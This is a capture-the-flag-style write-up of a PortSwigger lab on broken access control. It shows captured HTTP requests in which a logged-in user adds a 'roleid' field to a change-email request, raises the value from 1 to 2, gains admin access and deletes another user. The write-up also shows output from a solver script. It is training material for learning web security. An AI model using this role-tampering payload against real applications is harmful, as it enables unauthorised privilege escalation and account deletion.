# Lab: User role can be modified in user profile

### Instructions

This lab has an admin panel at 1. It's only accessible to logged-in users with a 1 of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Logging in with the provided credentials and navigating to `/admin` we get the following error:

```
Admin interface only available if logged in as an administrator 
```

Attempting to change our account email we can capture the request in Burp:

```
POST /my-account/change-email HTTP/2
Host: 0a0200aa03844cea81dca8d8006b0049.web-security-academy.net
Cookie: session=UNs2kZWqj4bApasbiGVn7QOgh88X9m0r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 25
Origin: https://0a0200aa03844cea81dca8d8006b0049.web-security-academy.net
Referer: https://0a0200aa03844cea81dca8d8006b0049.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"email":"test@test.com"}
```

Sending this we find our `roleid` set to 1:

```
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 117

{
  "username": "wiener",
  "email": "test@test.com",
  "apikey": "v7K5XVE0BBcbDZvp8MgqtdGNQzn6cjDN",
  "roleid": 1
}
```

Let's send this request again, this time using the discovered JSON and `roleid`, setting the value to 2:

```
POST /my-account/change-email HTTP/2
Host: 0a0200aa03844cea81dca8d8006b0049.web-security-academy.net
Cookie: session=UNs2kZWqj4bApasbiGVn7QOgh88X9m0r
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 122
Origin: https://0a0200aa03844cea81dca8d8006b0049.web-security-academy.net
Referer: https://0a0200aa03844cea81dca8d8006b0049.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
  "username": "wiener",
  "email": "test@test.com",
  "apikey": "v7K5XVE0BBcbDZvp8MgqtdGNQzn6cjDN",
  "roleid": 2
}
```

Once this is sent we can navigate to `/admin` and delete the user Carlos, solving the lab.

```
Home

|
Admin panel

|
My account
Users
wiener - Delete
carlos - Delete
```

### Python Solution

See `access_control_04.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Access_Control/Access_Control_04_user_role_can_be_modified_in_user_profile]
└─$ python access_control_04.py https://0a3000bc03ef1b6c812a7a4f006a008a.web-security-academy.net/
[+] Logged in as wiener
[*] Changing roleid from 1 to 2...
[+] Role changed to admin
[*] Deleting carlos...
[+] Carlos deleted - Lab solved
```